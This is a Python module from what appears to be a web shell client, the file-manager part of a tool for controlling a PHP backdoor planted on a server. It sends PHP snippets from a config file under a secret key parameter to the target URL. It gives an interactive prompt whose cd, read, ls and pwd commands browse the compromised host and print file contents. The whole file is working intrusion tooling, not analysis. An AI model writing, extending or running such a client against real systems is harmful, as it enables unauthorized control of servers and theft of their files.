import config.fileConfig as fileC
import requests as res
class fileManager:

    def __init__(self,con):
        self.con = con

    def Begin(self):
        #connect = 'http://127.0.0.1:8080/index.php'
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        #connect = connect + self.getBaseCode()
        #print(connect)
        date = { self.key : self.getBaseCode() }
        re = res.session()
        firstURL=re.post(self.connect,date)
        #print(firstURL.text)
        print(firstURL.text)
        self.FileMain(re)
        re.close()



    def getBaseCode(self):
        baseCodeForFile=fileC.PHP_fileBaseCode
        #print(baseCodeForFile)
        return baseCodeForFile

    def check(self,text):
        if len(text)<2:
            print('缺少参数')
        return len(text)

    def path(self,re):
        getpath = fileC.PHP_GETPATH
        date = { self.key : getpath }
        commit = re.post(self.connect,date)
        # print(commit.text)
        return commit.text

    def FileMain(self,re):
        while True:
            self.PATH = self.path(re)+" >"
            # print(PATH)
            flag = input(self.PATH).split()

            if flag[0] == 'exit':
                print('exit')
                flag == ''
                break
                
            if flag[0] == 'cd':
                if self.check(flag)>1:
                    chdir = fileC.PHP_CD.replace('##',flag[1],1)
                    print(chdir)
                    date = { self.key : chdir }
                    commit = re.post(self.connect,date)
                else:
                    continue
                
            if flag[0] == 'read':
                if self.check(flag)>1:
                    READ_r = fileC.PHP_READ.replace('##',flag[1],1)
                    # print(READ_r)
                    date = { self.key : READ_r }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                else:
                    continue

            if flag[0] == 'ls' or flag[0] == 'dir':
                dir = fileC.PHP_GETDIR
                date = { self.key : dir }
                commit = re.post(self.connect,date)
                print(commit.text,"\n")

            if flag[0] == 'pwd' or flag[0] == 'cwd':
                pwd = fileC.PHP_GETPATH
                date = { self.key : pwd }
                commit = re.post(self.connect,date)
                print(commit.text,"\n")
                
                


